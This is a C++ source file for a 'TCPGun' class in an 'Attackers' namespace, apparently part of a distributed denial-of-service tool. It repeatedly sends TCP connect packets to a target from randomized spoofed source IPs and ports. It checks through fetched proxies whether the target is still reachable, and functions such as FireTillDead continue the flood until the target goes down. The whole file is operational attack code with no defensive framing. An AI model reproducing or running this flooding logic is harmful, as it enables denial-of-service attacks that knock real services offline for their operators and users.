#include "tcp_gun.h"

#include "api_interface.h"
#include "tcp_wrapper.h"
#include "globals.h"
#include "config.h"
#include "utils.h"

using namespace Attackers;

bool TCPGun::FireWithoutProxy(const Target &targetToKill) noexcept
{
	// Checking connectivity over proxy, because packets would be send with randomized source
	const std::string currentTarget
		{targetToKill.address + ':' + std::to_string(targetToKill.port)};
	TCPWrapper tcpAttacker;

	auto resolvedAddress{tcpAttacker.CheckConnection(CURI(currentTarget), {})};
	while(!m_currentTask.ShouldStop() && resolvedAddress)
	{
		for(size_t count = 0; 
			count < AttackerConfig::TCPAttacker::TCP_ATTACKS_BEFORE_CHECK; count++)
		{
			Target fakeSource{GetRandomIP(), GetRandomPort()};
			TCPWrapper::TCPStatus sendStatus = tcpAttacker.SendConnectPacket(fakeSource, *resolvedAddress);
			if(sendStatus == TCPWrapper::TCPStatus::NeedConnectivityCheck ||
				sendStatus == TCPWrapper::TCPStatus::GotError)
			{
				std::cerr << "Got an error" << std::endl;
				return true;
			}
		}
		std::cout << "Already sent: " << 
			AttackerConfig::TCPAttacker::TCP_ATTACKS_BEFORE_CHECK << 
			" packets, recheking target..." << std::endl;
		resolvedAddress = tcpAttacker.CheckConnection(CURI(currentTarget), {});
	}
	return false;
}

void TCPGun::FireWithProxy(const Target &targetToKill) noexcept
{
	Informator informer;
	while(!m_currentTask.ShouldStop() && !informer.LoadNewData())
	{
	}

	std::optional<std::vector<Proxy>> proxies;
	while(!m_currentTask.ShouldStop() && !(proxies = informer.GetProxies()).has_value())
	{
	}

	// Checking connectivity over proxy, because packets would be send with randomized source
	const std::string currentTarget
		{targetToKill.address + ':' + std::to_string(targetToKill.port)};
	TCPWrapper tcpAttacker;
	auto resolvedAddress{tcpAttacker.CheckConnection(CURI(currentTarget), *proxies)};
	while(!m_currentTask.ShouldStop() && resolvedAddress)
	{
		std::cout << resolvedAddress->address << " is up" << std::endl;
		for(size_t count = 0; 
			count < AttackerConfig::TCPAttacker::TCP_ATTACKS_BEFORE_CHECK; count++)
		{
			Target fakeSource{GetRandomIP(), GetRandomPort()};
			if(tcpAttacker.SendConnectPacket(fakeSource, *resolvedAddress) == 
				TCPWrapper::TCPStatus::NeedConnectivityCheck)
			{
				break;
			}
		}
		std::cout << "Already sent: " << 
			AttackerConfig::TCPAttacker::TCP_ATTACKS_BEFORE_CHECK << 
			" packets, recheking target..." << std::endl;
		resolvedAddress = tcpAttacker.CheckConnection(CURI(currentTarget), *proxies);
	}
}

std::optional<Target> TCPGun::Aim(const CURI &uriToAttack) noexcept
{
	TCPWrapper tcpAttacker;
	Informator informer;
	informer.LoadNewData();

	for(size_t proxyTry = 0; 
		proxyTry < AttackerConfig::TCPAttacker::PROXY_RETRIES; proxyTry++)
	{
		if(const auto proxies = informer.GetProxies())
		{
			if(auto resolvedAddress{tcpAttacker.CheckConnection(uriToAttack, *proxies)})
			{
				return *resolvedAddress;
			}
		}
		informer.LoadNewData();
	}

	return {};
}

void TCPGun::FireTillDead(const Target &targetToKill) noexcept
{
	FireWithProxy(targetToKill);

	FireWithoutProxy(targetToKill);
}
